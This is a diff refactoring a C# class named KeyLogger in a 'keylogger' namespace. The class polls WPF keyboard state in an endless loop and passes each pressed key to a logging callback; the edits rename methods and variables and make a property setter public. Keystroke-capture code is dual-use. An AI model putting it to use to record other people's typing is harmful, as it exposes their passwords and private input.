@@ -1,14 +1,14 @@
 using System;
 using System.Windows.Input;
 using System.Threading.Tasks;
-using System.Collections.Generic;
 using System.Windows.Threading;
+using System.Collections.Generic;
 
 namespace keylogger
 {
     public class KeyLogger
     {            
-        public List<Key>LoggerKeys { get; private set; }
+        public List<Key>LoggerKeys { get; set; }
 
         private Dictionary<Key, bool> Keys;
 
@@ -25,7 +25,7 @@ namespace keylogger
             LoggerKeys = new List<Key>();
         }
 
-        public void Hook(Action<Key> LogKeys, Dispatcher dispatcher)
+        public void KeyHook(Action<Key> LogKeys, Dispatcher dispatcher)
         {
             if (Start)
                 return;
@@ -36,18 +36,18 @@ namespace keylogger
                 {
                     while (true)
                     {
-                        foreach (var item in Keys)
-                        {                           
+                        foreach (var key in Keys)
+                        {
                             dispatcher.Invoke(() =>
                             {
-                                if (Keyboard.IsKeyDown(item.Key) && item.Value == true)
+                                if (Keyboard.IsKeyDown(key.Key) && key.Value == true)
                                 {
-                                    LogKeys(item.Key);
-                                    Keys[item.Key] = false;
+                                    LogKeys(key.Key);                                    
+                                    Keys[key.Key] = false;
                                 }
-                                if (Keyboard.IsKeyUp(item.Key))
+                                if (Keyboard.IsKeyUp(key.Key))
                                 {
-                                    Keys[item.Key] = true;
+                                    Keys[key.Key] = true;
                                 }
                             });
                         }
